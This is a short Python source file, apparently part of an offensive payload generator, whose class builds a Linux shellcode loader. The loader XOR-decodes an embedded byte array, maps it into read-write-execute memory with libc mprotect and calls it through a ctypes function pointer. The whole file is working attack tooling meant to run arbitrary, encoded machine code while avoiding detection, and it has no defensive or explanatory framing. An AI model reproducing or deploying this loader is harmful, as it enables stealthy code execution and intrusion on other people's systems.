#!/usr/bin/env python3

class PythonLoader:
    """Generate Python shellcode loader for Linux"""
    
    @staticmethod
    def generate(encoded_shellcode, key):
        """Create Python loader with encoded shellcode"""
        shellcode_str = ','.join([f'0x{b:02x}' for b in encoded_shellcode])
        
        template = f'''
import ctypes
import sys

# Encoded shellcode
encoded = bytes([{shellcode_str}])

# Decode
shellcode = bytearray()
for byte in encoded:
    shellcode.append(byte ^ {key})

# Allocate executable memory
libc = ctypes.CDLL('libc.so.6')
sc = bytes(shellcode)

size = len(sc)
addr = libc.valloc(size)
addr = ctypes.c_void_p(addr)

# Make memory executable
libc.mprotect(addr, size, 7)  # PROT_READ | PROT_WRITE | PROT_EXEC

# Copy shellcode
ctypes.memmove(addr, sc, size)

# Execute
func = ctypes.CFUNCTYPE(None)(addr.value)
func()
'''
        return template.strip()